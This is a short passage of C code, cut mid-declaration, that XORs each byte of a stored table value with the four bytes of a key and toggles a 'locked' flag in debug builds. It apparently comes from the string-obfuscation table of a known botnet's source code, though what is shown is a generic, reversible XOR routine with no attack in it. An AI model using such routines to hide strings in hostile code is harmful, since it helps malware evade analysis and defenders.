            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
